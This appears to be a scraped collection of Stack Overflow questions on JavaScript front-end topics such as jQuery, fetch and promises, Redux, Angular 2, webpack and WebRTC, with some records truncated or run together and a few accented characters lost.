jQuery text() doesn't include spaces between elements," I have some arbitrary body text in a container. I don't control it so I don't know its structure. But something like this: That is just a simple example for illustration, in reality it could contain many more items and nested things like tables.I want to pull out all the text and do some processing on the words used. I'm using the following jQuery to get the text. The problem is that there are no spaces between each tagged item. The documentation says: Due to variations in the HTML parsers in different browsers, the text returned may vary in newlines and other white space.And all my searches seem to pull up results for removing white space. Is there a way pull out all the text and keep space between elements? Needs to happen in-browser so javascript-ish methods. <code>  <div id='content-area'> <h1>Heading</h1> <p>A paragraph or two</p> <ul> <li>item 1</li> <li>item 2</li> </ul></div> $('#content-area').text()// HeadingA paragraph or twoitem 1item 2",Alternative to jQuery text() that includes spaces between elements?

Why the response object from JavaScript fetch API is a promise?," When requesting from a server with JavaScript fetch API, you have to do something like Here, response.json() is resolving its promise.The thing is that if you want to catch 404's errors, you have to resolve the response promise and then reject the fetch promise, because you'll only end in catch if there's been a network error. So the fetch call becomes something like This is something much harder to read and reason about. So my question is: why is this needed? What's the point of having a promise as a response value? Are there any better ways to handle this? <code>  fetch(API) .then(response => response.json()) .catch(err => console.log(err)) fetch(API) .then(response => response.ok ? response.json() : response.json().then(err => Promise.reject(err))) .catch(err => console.log(err))",Why is the response object from JavaScript fetch API a promise?

Comparing SHA256 made with PHP hash() and NodeJS crypto.hash()," I'm working on making a real-time application for my website in NodeJS, allowing my users to log in with their accounts, etc. However, I am having some issues with the logging in part. When I register/login the users on the main site, I hashed their password using PHP's hash() function like so: and it works great on my siteHowever I need to be able to grab the user's salt from the database in NodeJS and be able to hash the user's inputted password, check it against the database's password, and make sure they match to log the user in. I do this by doing something like this: However, when I console.log() the hashed variable and the dbPassword variable, they're not equal - so it always return false/responds with incorrect password.So, my question: Is there any way I can accurately hash a sha256 string in NodeJS the same way I do in PHP? PS:For now I am using Ajax/jQuery to login via PHP Script but I want to be able to completely move from Apache/PHP hosting to the site just being hosted with NodeJS (SocketIO, Express, MySQL). I just started working with NodeJS recently and I have made functionality on my Apache site to work with NodeJS, but I heard that hosting the whole site itself using NodeJS would be a lot better/more efficient.

Property Names & Valid Identifiers In JavaScript," Updated QuestionWhat, exactly, qualifies as a valid property name in Javascript? How do various methods of property assignment differ? And how does the property name affect property access?NoteThe answers to my original question (seen below) helped to clear some things up, but also opened a new can of worms. Now that I've had a chance to become a bit more familiar with JavaScript, I believe I've been able to figure a lot of it out.Since I had a hard time finding this information consolidated into one explanation, I thought it might be helpful to expand my original question, and attempt to answer it.Original QuestionOriginally, there was some confusion with the MDN JavaScript guide (object literals). Specifically, I wondered why they claimed that if a property name was not a valid JavaScript identifier, then it would have to be enclosed in quotes. Yet, they offered example code that showed that the number 7 could be used without quotes as a property name.As it turns out, the guide simply left off one important part, and Pointy updated it (changes in bold): If the property name would not be a valid JavaScript identifier or number, it must be enclosed in quotes.I also wondered why property names were allowed to deviate away from the ""may not start with a digit"" rule, that applies to identifiers. That question actually reveals the complete misunderstanding that I had of property names, and is what lead me to do some more research.  <code> ","Valid property names, property assignment and access in JavaScript"

Remove value from object without mutating it," What's a good and short way to remove a value from an object at a specific key without mutating the original object?I'd like to do something like: I know there are a lot of immutability libraries for such tasks, but I'd like to get away without a library. But to do this, a requirement would be to have an easy and short way that can be used throughout the code, without abstracting the method away as a utility function.E.g. for adding a value I do the following:let o2 = {...o1, age: 31};This is quite short, easy to remember and doesn't need a utility function.Is there something like this for removing a value?

Writing the full path of the file when it is browsed uisng php," So far I wrote a script so that I can browse for a file and see the printed name of the file. Here is the script: When I hit the browse button and choose a file, only the name of the file gets printed on my web page (My web-browser is Firefox and I am using a local server). Is there a way to print the whole address of the file? What I have found on the web so far were mostly suggesting ways when we know in advance ""/path/to/file"". But how can it be done if I randomly choose a file? If there is no way to do it with PHP because of security issues according to: How to get full path of selected file on change of <input type=file> using javascript, jquery-ajax?, Is it possible t do it with C, C++, html, etc?I really need to show the local path of the directory. What are the alternatives? The answer is it can't be done? I found this website http://www.htaccesstools.com/articles/full-path-to-file-using-php/Don't know how it works though.The other alternative would be to define a fixed path and let the user only choose that directory and since it is known I can print it out.

Firebase Javascript Client Library's Structure / Pattern," I'm thinking about making my own JavaScript client library, and I like the way Firebase formats requests. I'm trying to understand whats going on. From looking at the web guide here I found the below code: I can see that ref is equal to a function called Firebase, and usersRef is equal to ref.child.I'm imagining something like this: Here I can see that usersRef.set is being called but I can't figure out how or where this would go? Is set a function or an object? I notice firebase has set(), update(), push() and transaction(), making me think these are functions. Maybe I'm on the wrong path totally, I'm just not familiar with this pattern. <code>  var ref = new Firebase(""https://docs-examples.firebaseio.com/web/saving-data/fireblog"");var usersRef = ref.child(""users"");usersRef.set({ alanisawesome: { date_of_birth: ""June 23, 1912"", full_name: ""Alan Turing"" }, gracehop: { date_of_birth: ""December 9, 1906"", full_name: ""Grace Hopper"" }}); Firebase = function(url) { this.child = function(path) { console.log(url); console.log(path);};}; ""TypeError: Cannot read property 'set' of undefined",Mimic Firebase client library's structure and patterns

How can I connect nested Redux smart components with reducers?," Similar to the ToDo example for Redux, my project structure is similar - just a container with an array of child components to display.

Hence, I've made each widget a connected smart component with a dedicated WidgetReducer to keep those state changes separate.I'd like the WidgetReducer to be concerned with just one widget at a time, so the state handled by it would just be a single widget node like: My Workspace component currently iterates over all Widgets, passing the Widget ID to each Widget smart component: My Widget component is like so: How can I connect each Widget component so it receives only state updates on it's own Widget object, and the connected Widget Reducer is only concerned with individual Widget objects, rather than a collection of them?  <code>  { workspace: { widgets: [1, 2, 3] } widgets: { 1: { id: 1, title: 'First Widget', lastPrice: 123.324, lastUpdate: '2015-11-12' }, 2: { id: 2, title: 'Second Widget', lastPrice: 1.624, lastUpdate: '2015-11-12' }, 3: { id: 3, title: 'Third Widget', lastPrice: 4.345, lastUpdate: '2015-11-12' } }} { id: 3, title: 'Third Widget', lastPrice: 4.345, lastUpdate: '2015-11-12'} @connect(state => ({ workspace: state.workspace }))export default class Workspace extends React.Component { render() { return ( <div> {this.props.workspace.widgets.map(id => (<Widget key={id} widgetId={id} />) )} </div> ); }} @connect((state, ownProps) => ({ widget: state.widgets[ownProps.widgetId]}))export default class Widget extends React.Component { componentWillMount() { this.props.dispatch(subscribeToUpdates(this.props.widgetId)); } render() { return ( <div> <header>{this.props.widget.title}</header> <div> /* Other widget stuff goes here */</div> </div> ); }}",Connecting nested Redux smart components with reducers

Cold Observable from an EventEmitter," Is there a way to have a hot observable from an EventEmitter (or equivalent available in Angular 2 alpha 46 / RxJS 5 alpha)? i.e. if we subscribe after the value is resolved, it triggers with the previously resolved value. Similar to what we have when always returning the same promise.Ideally, only using Angular 2 objects (I read somewhere a light RxJS would be embedded later to remove the dependency), otherwise importing RxJS is fine. AsyncSubject seems to match my need, but it is not available in RxJS 5 alpha.I tried the following, without success (never triggers). Any idea about how to use it? Full plunker here comparing hot and coldUsecase: reach some async objects only once (for example a series of HTTP calls merged/wrapped in a new EventEmitter), but provide the resolved async object to any service/component subscribing to it, even if they subscribe after it is resolved (the HTTP responses are received).EDIT: the question is not about how to merge HTTP responses, but how to get a (hot?) observable from EventEmitter or any equivalent available with Angular 2 alpha 46 / RxJS 5 alpha that allows to subscribe after the async result is retrieved/resolved (HTTP is just an example of async origin). myEventEmitter.share() does not work (cf plunker above), although it works with the Observable returned by HTTP (cf plunker from @Eric Martinez). And as of Angular 2 alpha 46, .toRx() method does not exist any more, the EventEmitter is the observable and subject itself.This is something working well with promises as long as we always return the same promise object. Since we have observers introduced with HTTP Angular 2 services, I would like to avoid mixing promises and observers (and observers are said to be more powerful than promises, so it should allow to do what is easy with promises).Specs about share() (I haven't found doc for version 5 alpha - version used by Angular 2) - working on the Observable returned by the Angular 2 HTTP service, not working on EventEmitter.EDIT: clarified why not using the Observable returned by HTTP and added that not using RxJS directly would be even better.EDIT: changed description: the concern is about multiple subscriptions, not merging the HTTP results.Thanks! <code>  let emitter = new EventEmitter<MyObj>();setTimeout(() => {emitter.next(new MyObj());});this.observable = emitter;return this.observable.share();",Hot and shared Observable from an EventEmitter

Plotting very large amounts of points on htm5 canvas with javascript," I am trying to draw a huge (60k) number of (x, y) points on an HTML5 canvas and simulate streaming data points with D3.js in Chrome and Firefox, and finding that the browser freezes and crashes after about 10 seconds.I am generating the data set with random values as follows: Would it help to break generation of data into sections?

NaN != NaN or NaN !== NaN," First of all I want to mention that I know how isNaN() and Number.isNaN() work. I am reading The Definite Guide by David Flanagan and he gives an example for how to check if the value is NaN: This will result in true if and only if x is NaN.But now I have a question: why does he use strict comparison?

Chrome extension ajax sending malformed latin characters," I am sending an AJAX POST request using jQuery on a chrome extension but the data doesn't arrive as expected, accented characters turn out malformed.The text ""HGERSTEN"" becomes ""HGERSTEN"".The text appears fine in the console etc, only via AJAX to this other page it appears as mentioned. My AJAX call is basic, I send a data-object via jQuery $.ajax. I've tried both with and without contentType, UTF-8 and ISO-8859-1. No difference.This is how I make my AJAX call: The newValues object has more values but I retrieve them from a form. However, I have tried to specify these values manually as newValues['name'] = ''; and still would cause the same problem. The original form element of the page that I am sending the AJAX to contains attribute accept-charset=""iso-8859-1"". Maybe this matters. The target website is using Servlet/2.5 JSP/2.1. Just incase it might make a difference.I assume this is an encoding issue and as I've understood it should be because Chrome extensions require the script files to be UTF-8 encoded which probably conflicts with the website the plugin is running on and the target AJAX page (same website) which is using an ISO-8859-1 encoding, however I have no idea how to deal with it. I have tried several methods of decoding/encoding it to and from UTF-8 to ISO-8859-1 and other tricks with no success.I have tried using encodeURIComponent on my values which only makes them show that way exactly on the form that displays the values I have sent via POST, as e.g. H%C3%84GERSTEN.I have no access to the websites server and cannot tell you whether this is a problem from their side, however I would not suppose so.UPDATENow I have understood POST data must be sent as UTF-8! So a conversion is not the issue? <code>  var newValues = {name: 'HGERSTEN'}$.ajax({ url: POST_URL, type: 'POST', data: newValues, success: function() ...});",Chrome extension ajax sending malformed accented characters

Angular 2 Change detection," I am trying to create a simple example project to test the angular 2 change detection mechanism: I create a pure javascript object in script tags on the main index page. it contains the following: One function to console log it, and one to change the text property.Now in Angular 2 the code looks like this: What I am trying to do is this:When I call the function Tryout.printme() normally with onclick (Completely outside of angular) I want angular to detect the change and update the screen.I succeeded to this point: When I call Tryout.printme() from the component (the changeme() function is calling Tryout.printme()), Angular detects the change and updates the UI which is fine. Also, when I change from outside angular and I call consoleLogMe() from Angular it is logging the changed text and updates the UI. I guess I need to execute Tryout.changeme() in the same Zone that Angular is running in somehow. Any ideas? I have a big project which is done in pure javascript/jquery, and now I slowly need to rewrite the handlebar templates to angular2 components without touching the model (yet). For that I need to force the model to execute in the same zone as angular.If I wanted to do something like this in Angular 1 I would just $scope.$apply it would work.Here is a gif from the example: <code>  var Tryout = {}; Tryout.text = ""Original text here""; Tryout.printme = function(){ console.log(Tryout.text); } Tryout.changeme = function(){ Tryout.text = ""Change was made""; } import {Component} from ""angular2/core""@Component({ selector: 'my-app', template: ` <h1>{{TryoutRef.text}}</h1> <input type=""text"" [(ngModel)]=""TryoutRef.text""> <button (click)=""consoleLogMe()"">Console Log</button> <button (click)=""changeMe()"">Change me inside</button> `})export class MyApp{ TryoutRef:any = Tryout; constructor(){ } changeMe(){ this.TryoutRef.changeme(); } consoleLogMe(){ console.log(this.TryoutRef.text); }}declare var Tryout:string;",Angular 2 How to get Angular to detect changes made outside Angular?
Why is immutability so important(or needed) in javascript?," I am currently working on React JS and React Native frameworks. On the half way road I came across Immutability or the Immutable-JS library, when I was reading about Facebook's Flux and Redux implementation.The question is, why is immutability so important? What is wrong in mutating objects? Doesn't it make things simple?Giving an example, let us consider a simple News reader app with the opening screen being a list view of news headlines.If I set say an array of objects with a value initially I can't manipulate it. That's what immutability principle says, right? (Correct me if I am wrong.)But, what if I have a new News object that has to be updated? In usual case, I could have just added the object to the array.How do I achieve in this case? Delete the store and recreate it?Isn't adding an object to the array a less expensive operation? <code> ",Why is immutability so important (or needed) in JavaScript?

Javascript Promises vs Async Await. Difference?," I have been using ECMAScript 6 and ECMAScript 7 features already (thanks to Babel) in my applications - both mobile and web.The first step obviously was to ECMAScript 6 levels. I learnt many async patterns, the promises (which are really promising), generators (not sure why the * symbol), etc.Out of these, promises suited my purpose pretty well. And I have been using them in my applications quite a lot.Here is an example/pseudocode of how I have implemented a basic promise- As time passed, I came across ECMAScript 7 features, and one of them being ASYNC and AWAIT keywords/functions. These in conjunction do great wonders. I have started to replace some of my promises with async & await. They seem to add great value to programming style.Again, here is a pseudocode of how my async, await function looks like- Keeping the syntax errors (if any) aside, both of them do the exact same thing is what I feel. I have almost been able to replace most of my promises with async,awaits.Why is async,await needed when promises do a similar job?Does async,await solve a bigger problem? Or was it just a different solution to callback hell?As I said earlier, I am able to use promises and async,await to solve the same problem. Is there anything specific that async await solved?Additional notes:I have been using async,awaits and promises in my React projects and Node.js modules extensively.React especially have been an early bird and adopted a lot of ECMAScript 6 and ECMAScript 7 features. <code>  var myPromise = new Promise( function (resolve,reject) { var x = MyDataStore(myObj); resolve(x); });myPromise.then( function (x) { init(x);}); async function myAsyncFunction (myObj) { var x = new MyDataStore(myObj); return await x.init();}var returnVal = await myAsyncFunction(obj);",What is the difference between JavaScript promises and async await?

Escaping characters in CSS class names," I'm trying to implement this W3 description of character escapes in CSS class selectors.I'm running into problems with the abc\20 def syntax that puts a space after the escape sequence to ensure def is not misread as part of the character code.Specifically, trying to put abc\XY def into an HTML class attribute or into a command like jQuery().addClass('abc\\20 def') (the \\ here is part of the JS string literal syntax; the string value itself has one slash) will both give the element two classes, abc\20 and def.Is this syntax just badly implemented, and I should stick with the six-digit leading zero form? Or does that document only refer to the escape format in CSS code, and the HTML attribute / jQuery argument require some different form of escaping the space character?Edit: Thank you very much for explaining, everyone!I now understand that this syntax only applies to CSS code - not the class names themselves as set in HTML attributes or Javascript.This also means that characters designated as whitespace can't occur in CSS class values, and no kind of escape mechanism allows them to be added. (Specifically, if I understand correctly, the CSS selector .abc\20 def is valid and selects elements with the class abc def, but is meaningless because no element can have this class.)For my concrete use case, which involves mapping arbitrary values (which can have white space) to valid class names, I need to define my own escape scheme. Replacing whitespace with - or _ (thanks Praveen) is one possibility; if the mapping needs to be one-to-one, replacing them with six-digit Unicode hex values (eg. ""abc def"" -> ""abc\000020def"" is a more robust one.The important thing to keep in mind is that this replacement affects the class name itself - to refer to the class abc\000020def in CSS, the backslash must be escaped again, to form the selector .abc\\000020def. <code> ",Escaping characters in CSS class selectors

Javascript: Timer function not working correctly when stopped and started multiple times," First of all, you can find an example of my code in JS Fiddle and also below the question.I'm working on a personal training webapp and basically you can hit play and then you get five minutes to do a series of tasks in a random order. The program creates the sessionTasks array in which are put in a random order tasks for the tasks array in order to fit the five minute limit. Right now the tasks array is just one I created with four tasks and the respective times just for testing.The problem I ran into is the following: When you click the task so you can move forward to the next task, the next time you play seconds will move faster. The way I found to replicate is:Click play.Power through the tasks by clicking the task text very quickly.Click play again.Now the seconds should be moving quicker. If not, repeat what you just did. It is irregular but it usually does it in the second try.I cannot for the life of me understand why it behaves like this. I thought that maybe it was creating more Timers that all used #taskTimer to run but that didn't make sense to me. Is it something wrong with the Timer function?

How browsers store data for autocmplete and where?," I recently came across an issue regarding browser autocomplete functionality. One might find it in forms on web pages.Issue is with data, that is placed into other fields depending on selection of autocomplete for one field.

On normal form submit event or some other events as well?Thank you in advance. <code> ",How browsers store data for autocomplete and where?

Does a dumb component could use/render redux container component?," In the getting started video of Redux we see that the Footer (a dumb component) uses Filterlink (a container).But when I read this article, it seems, but not very clearly, that only containers should use/render containers.For me, if Footer uses Filterlink (which is tied to Redux) I can't reuse it on other projects which don't use Redux. But maybe it is an exception? Maybe hard coding dumb component for use only on one project is ok?Am I missing something? <code> ",Can a dumb component use/render redux container component?

What is the difference between exporting a function expression and a function declaration in a ES6 module?," As I understand it (see section 16.3.2.1), ES6 allows different syntaxes for function / class export operands. The difference refers to whether the exported function needs to be interpreted at import as a function declaration, in which case you write: export default function () {} // (a) or as a function expression: export default (function () {}); // (b).As a possible related sidenote: I read that imports are hoisted, but I'm not really sure what that means in this context.Taking the case of this example:import foo from 'my_module'; // (c)As I understand it, the above statement will save my exported function in a foo variable. Is that variable hoisted, or what is, and when?Most importantly, what is the difference (in terms of setting foo) when my_module exports the function using (a) and when it exports it using (b)? <code> ",What is the difference between importing a function expression or a function declaration from a ES6 module?

Separate CSS and JS in Webpack?," I have:JS files that I want to bundle.LESS files that I want to compile down to CSS (resolving @imports into a single bundle).I was hoping to specify these as two separate inputs and have two separate outputs (likely via extract-text-webpack-plugin). Webpack has all the proper plugins/loaders to do compilation, but it doesn't seem to like the separation.I've seen examples of people requiring their LESS files directly from JS, such as require('./app.less');, for no other reason than to tell webpack to include those files into the bundle. This allows you to only have a single entry point, but it seems really wrong to me -- why would I require LESS in my JS when it has nothing to do with my JS code?I tried using multiple entry points, handing both the entry JS and main LESS file in, but when using multiple entry points, webpack generates a bundle that doesn't execute the JS on load -- it bundles it all, but doesn't know what should be executed on startup.Am I just using webpack wrong? Should I run separate instances of webpack for these separate modules?

is a good pattern to put Actions in the Store?," I'm building an app that needs to show a confirm dialog in some situations.Let's say I want to remove something, then I'll dispatch an action like deleteSomething(id) so some reducer will catch that event and will fill the dialog reducer in order to show it.My doubt comes when this dialog submits.How can this component dispatch the proper action according to the first action dispatched?Should the action creator handle this logic?Can we add actions inside the reducer?edit:to make it clearer: So I'm trying to reuse the dialog component.

How to set multiple local values at once?," Consider the following: foo will be a local variable to the functionbar will be a global variable to the windowDue to their scoping, both variables will have a value of 1 inside the function, but bar will persist outside the function (in global scope).I'm curious if there is a way to initialize variables using the assignment operator, without a loop or an object. I'm looking for a keyword or prefix that would make bar locally scoped. The idea is to be DRY and efficient.Edit:The example above is simple. One option, using 10 variables, might be to predeclare the variable to the local scope before initializing it: However, doing so is both repetitive and harder to read. A person could use an array or object, but that is a little less clear and more cluttered.The background was that another developer was doing var foo = bar = true inside a function, which I pointed out is only setting one local variable. They were not aware of that and wanted to change and asked if it's possible to inline and set multiple local variables, without typing each one multiple times (and not refactor code w/ array or object). Upon originally asking this question, I was exposed to ES6, but had yet to fully read the docs. My thinking was that ES6 has some nice features (e.g., rest, destructuring assignment) and so perhaps it also provided a way to massively initialize a large block of variables to the same scope and value. <code>  (function(){ var foo = bar = 1;}()); var foo, bar, baz, foobar, foobaz, bazfoo, barbaz, bazbar = foo = bar = baz = foobar = foobaz = barbaz = true;",How to set multiple local variables to the same value in a single declaration?

Pass data from an Angular modal back to the main controller," Here is the thing. I am not able to pass data from angular modal back to the controller where i need it. the codes given below. Controller side As you can see above, there is the main controller. I have used a modal inside there which has its own controller. I make ajax call inside that modals controller and get a response back. I want that response as a result to be available back at the adduser function so that i can work with that data. However, it seems that once the adduser function starts, it goes to the ModalInstanceCtrl and ends its execution there. It doesnt come back to the adduser function at all. I need a way to get back to the adduser function. Can anyone let me know how to achieve this. Also how to pass the object response from ModalInstanceCtrl to the main controller inside adduser function.  <code>  'use strict'var DataMod = angular.module('Data', [""angularGrid"", 'ui.bootstrap.contextMenu', 'ui.bootstrap']);DataMod.controller('DataController', ['$scope', '$compile', '$uibModal', '$log','$rootScope', '$http', function ($scope, $compile, $uibModal,$log, $rootScope, $http, ngUtilityService) {//user first clicks on Add button.

Cordova gradlew issue with meteor run android," I am attempting to run a Meteor project on an Android device and/or emulator. When I run either meteor run --verbose android or meteor run --verbose android-device, I get errors related to Cordova not being able to find certain gradle files. Here's some output from my console: Indeed, the files and directories it is trying to access are not there. $ANDROID_HOME/tools/template/gradle/wrapper does not have a directory gradlew Likewise, there are no files at all in my ~/simple-todos/.meteor/local/cordova-build/platforms/android/gradle/wrapper directory, so there is no gradle-wrapper.properties.I'm also quite uncertain about the meaning of the spawn ENOENT error.How can I fix this?EDIT: I wanted to test that gradle worked at all on my machine, so I made an app in Android Studio and ran it on my phone-- worked fine. My Meteor project still doesn't run on Android, but I think this tells me that gradle is working (somewhere) on my computer.EDIT: I searched for a gradlew directory on my computer and the only ones I found were in an android-studio, not in my $ANDROID_HOME(~\Android/Sdk).

Will trailing commas will break JSON?," So I've been reading up on proposed JavaScript features, and one I'm concerned about is trailing comma support in object literals and arrays.For parameters, trailing commas don't relate here, so let's ignore that. I understand the Version Control benefits, but I'm worried how it will react to JSON. This would become valid.But what will happened when you return JSON syntax? JSON is supported by RFC, so I doubt JSON will ever support trailing commas. Maybe one day..But how will JavaScript handle returning something like: Will the trailing comma be removed internally if the header content type is JSON or will trailing commas break everything? <code>  const arr = [ 'red', 'green', 'blue',]; const jsonReturn = [{ ""derp"":1}, { ""foo"":""bar""}, { ""slide"":true,},];",Will trailing commas break JSON?

"React container structure - purely a wrapper, or more?"," I spend a lot of time thinking about how to best structure things as cleanly as possible in React. Lately I've been getting hung up on whether React containers should do nothing but connect to Redux (or other data - a la Meteor) and render/return a single component, or if containers should also be in charge of event-handling as well. So for example, it's a toss-up between these two models:Model 1 Model 2 It almost feels like in model 1, Thing becomes its own container in a sense, which I'm not sure I like. Model 2 feels more natural, as ThingContainer is charged with not just dealing with data and Redux, but also handling events, firing off Ajax requests in componentDidMount, etc. With the first model, if I wanted an Ajax request to be invoked in componentDidMount, it would have to go in Thing which doesn't seem right.I'm wondering if there are any particular advantages or pitfalls to either of these approaches, or if it just comes down to style/preference. <code>  // ThingContainer.jsimport Thing from '../components/Thing';export default someHigherOrderFunc(/* map state/data to props */)(Thing)// Thing.jsexport default class Thing extends Component { handleClick() { /* ... */ } handleMouseEnter() { /* ... */ } render() { // Other components rendered here, both container or presentational }} // ThingContainer.jsclass ThingContainer extends Component { handleClick() { /* ... */ } handleMouseEnter() { /* ... */ } render() { // Now Thing can be stateless return <Thing onClick={this.handleClick} onMouseEnter={this.handleMouseEnter} /> }}export default someHigherOrderFunc()(ThingContainer)","Can I put AJAX calls in the presentational component, or should I extract a container?"

Especially since working with the object spread operator using Babel is already possible.I did not found anything better than first copy the object, and than assign/delete the property I want like this: I feel like it could be shorter <code>  function updateState(state, item) { newState = {...state}; newState[item.id] = item; return newState;}function deleteProperty(state, id) { var newState = {...state}; delete newState[id]; return newState;}",What is the shortest way to modify immutable objects using spread and destructuring operators

Am getting ICE candidates only with sdpMid=audio but not for video," The browser used is Chrome... I have the caller and receiver code to generate SDP and ICE candidates.I get the caller code to generate proper SDP and ICE candidates with sdpMid=video but for the receiver, I am getting ICE candidates generated only for sdpMid=audio. UPDATE: Here is the localSessionDescription SDP for the receiver after changes, as suggested: This is generated for the corresponding getUserMedia as in: The ICE candidate generation code is: On console.log, I see ICE candidates, as in: Needless to say, I am not able to get the remote video displayed. I am trying this on a local network so really even STUN is not required.I would like to know, why I am not getting any ICE candidates for sdpMid=video. Also, of the four ICE candidates generated,three ICE candidates have a sdpMLineIndex:0 and one ICE candidate has candidate property as null!UPDATE 1: I got the answer to the last issue... Candidate property as Null. ""Note: the RTCPeerConnection.onicecandidate will be called once with an empty candidate property to signal the end of trickle ICE event."" This is explained here.On the caller side, I get more than 10 ICE candidates, some with audio and some with video. Where am I going wrong?

Storing Objects with Prototype Functions in Redux State," Is it considered bad practice to store classes in the state? I've read that the state should be easily serializable objects and classes break this convention.I'm creating a web application that uses React/Redux with a set of backing models to collect information from the user.So for example I have the following model: The object is added to the store by issuing the following actionCreator: The appropriate person reducer sticks it into the state so I can get at it from the rest of the application.This way when I grab the object from the state I can run it's validate and valid prototype functions to see if the model is valid and react appropriately.Does this break React/Redux convention? What would be another way to approach this problem? What are the potential problems I might run into down the road with the above approach? Right now can't foresee any problems... but I also don't have much experience with React/Redux (~4 months)Edit: I should add that I only mutate the object state through the reducers. I am careful to not mutate state elsewhere in the application. <code>  class Person { constructor(params = {}) { this.firstName = params.firstName || ''; this.lastName = params.lastName || ''; this.gender = params.gender || ''; this.dateOfBirth = params.dateOfBirth || ''; this.stateOfResidence = params.stateOfResidence || ''; this.email = params.email || ''; } validateField(args) { // remove for brevity } valid(args) { // remove for brevity }} export function addPerson(args = {}) { return (dispatch) => { dispatch({ type: 'ADD_PERSON', obj: new Person(args) }); };}",Storing objects with prototype functions in Redux state

facebook javascript sdk login not working on iOS," I'm trying to allow a user to login to my webapp via facebook login using the javascript SDK. It works on desktop (safari and chrome), however the pop up fails on both safari and chrome on iOS. The error is straight forward to chrome where the browser and OS are not supported. This issue has a work around described here. It is less clear what the issue is with safari and not seeing the pop up. The login call is called on a button click so I don't believe the browser should block it. I also tried allowing pop ups as suggested here but that solution did not work nor is it a viable long term solution to force users to change that setting.

Cannot find module ReactNative from 'react-native.js'," I've been trying to get Jest working with my react native project without much luck. Seems most threads are hacked solutions to get things up and running and I can't seem to get over the last hurdle I'm facing. ProblemI'm getting the following error when trying to run the following piece of code. If I mock react-native inside of the jestSupport/env.js file I can get past the error but obviously I cannot use any of the structures such as AsyncStorage to actually test my code (as I'll only have the mocked functionality).

race condition with async actions," We have an action that fetches an object async, let's call it getPostDetails, that takes a parameter of which post to fetch byan id. The user is presented with a list of posts and can click on one to get some details.If a user clicks on ""Post #1"", we dispatch a GET_POST action which might look something like this. This is picked up by a middleware, which adds a success handler to the promise, which will call an action likeGET_POST__OK with the deserialized JSON object. The reducer sees this object and applies it to a store. A typical__OK reducer looks like this. Later down the line we have a component that looks at currentPost and displays the details for the current post.However, we have a race condition. If a user submits two GET_POST_DETAILS actions one right after the other, there isno guarantee what order we recieve the __OK actions in, if the second http request finishes before the first, thestate will become incorrect. How can we make sure the last item the user clicked always will take priority? <code>  const getPostDetails = (id) => ({ type: c.GET_POST_DETAILS, promise: (http) => http.get(`http://example.com/posts/#${id}`), returnKey: 'facebookData'}) [c.GET_ALL__OK]: (state, response) => assign(state, { currentPost: response.postDetails}) Action => Result ---------------------------------------------------------------------------------|T| User Clicks Post #1 => GET_POST for #1 dispatched => Http Request #1 pending|i| User Clicks Post #2 => GET_POST for #2 dispatched => Http Request #2 pending|m| Http Request #2 Resolves => Results for #2 added to state|e| Http Request #1 Resolves => Results for #1 added to state V",How to avoid race conditions when fetching data with Redux?

how to check duplicate of my input file upload," I have this form which has a button for file upload. When you select a file it shows at upload_prev div. My problem is that when I try to select the same file nothing happens. I would like a validation or kind of non duplication function to run.I did that. I tried many things and methods like using child nodes and seeing if the inner text is the same. I tried to loop using jquery each and getting the value, but all of them failed. I want to display a message that this file is already in the Box of upload_prev when I select it again. This is my fiddle.

Understanding React-Redux and mapStateToProps," I'm trying to understand the connect method of react-redux, and the functions it takes as parameters. In particular mapStateToProps().The way I understand it, the return value of mapStateToProps will be an object derived from state (as it lives in the store), whose keys will be passed to your target component (the component connect is applied to) as props.This means that the state as consumed by your target component can have a wildly different structure from the state as it is stored on your store.Q: Is this OK?Q: Is this expected?Q: Is this an anti-pattern? <code> ",Understanding React-Redux and mapStateToProps()

How do I return the accumulated results of multiple asynchronous function calls in a loop?," I have a function foo which makes multiple (parallel) asynchronous calls in a loop. I need to somehow wait until the results of all of the calls are available. How can I return the full results from foo, or otherwise trigger some processing after all of the data is available?I tried adding each result to an array, but then the array isn't populated until after the point where I need to use it. Note: this question is deliberately generic along the lines of the existing generic ""How do I return the response from an asynchronous call?"" question. That question has some excellent answers, but doesn't cover multiple async calls. There are some other questions that mention multiple calls, but I couldn't find any loop-based ones, and some only had jQuery answers, etc. I'm hoping here for some generic techniques that don't depend on a particular library. <code>  function foo() { var results = []; for (var i = 0; i < 10; i++) { someAsyncFunction({someParam:i}, function callback(data) { results.push(data); }); } return results;}var result = foo(); // It always ends up being an empty array at this point.",How do I return the accumulated results of multiple (parallel) asynchronous function calls in a loop?

Detect High Contrast Mode in Chrome Browser," I am trying to make my website accessible in high-contrast mode. In order to detect when high-contrast mode is enabled, I created a JavaScript method to detect if background images are disabled, because high-contrast mode disables background images. Then if the browser is in high-contrast mode, I append a CSS file to make fixes for displaying in high contrast. This works fine in Firefox, Edge, and IE, but Chrome uses its own extension to create high-contrast, and it does not disable the background images, so in Chrome the CSS for high contrast is not appended. From searching I have found that Chrome adds a filter over the website as opposed to enabling/disabling/changing the website colors or images themselves. I have searched and searched, but I can't find anything to test to check if Chrome is using high-contrast mode. If there were a way to detect which extensions are being used that would also solve the problem, but I haven't been able to find a way to do that either.My code actually works fine, all I need is to be able to detect the high-contrast mode in Chrome. Here is the method I use to check for high-contrast mode.  <code>  let highContrast = (options) => { let hcDetect = jQuery(`<div id=""jQHighContrastDetect""></div>`).css('background', 'url(../uploads/c-wht-small.png)'); hcDetect.appendTo(document.body); if (hcDetect.css('background-image') === 'none') { $('head').append('<link rel=""stylesheet"" href=""../css/highcontrast.min.css"" type=""text/css"" media=""all"">'); }}",Detect High Contrast extension use in Chrome browser
Converting File object to Image object in Javascipt," So I have a website (using AngularJS) that lets users upload files via tag When I handle the upload in the controller the image gets stored as a File object.

E6 Promise Errors not bubbling up as expected," I am starting with E6 Promises. I like them very much, but there is a crucial concept around error handling that I don't understand and would love some clarification on.Let's assume the following simple function that returns a promise: It is pretty straightforward, just returns a promise for the string that was passed to it, and causes that promise to be resolved or rejected (based on the third argument) in ""timeout"" milliseconds.I can consume this completely as expected as follows: If alter the third argument to from ""true"" to ""false"" in any of the calls in this chain, my error is caught as expected and send to console.error().However, now imagine the following (similarly silly) function for constructing a promising object: Imagine now that I consume this code as follows, with everything resolving and nothing rejecting, (doResolve is set to true): As would be expected, I see the following in the console: DoublePromise: BigPromiseHowever, now I alter the consuming code, setting doResolve to ""false"" (which causes my promise routine to reject): Because of my understanding of how errors should ""bubble up"", I would expect the console to log as follows: I did catch: Rejecting BigBut it does not. Instead, the console shows an uncaught error: Uncaught (in promise) Error: Rejecting BigI only get what I expect (and desire) if I add a catch to the end of the chain in the DoublePromiser, like this: Now I get what I expect, the error is not uncaught. But this seems counter to the whole idea that errors bubble up, and it seems weird to 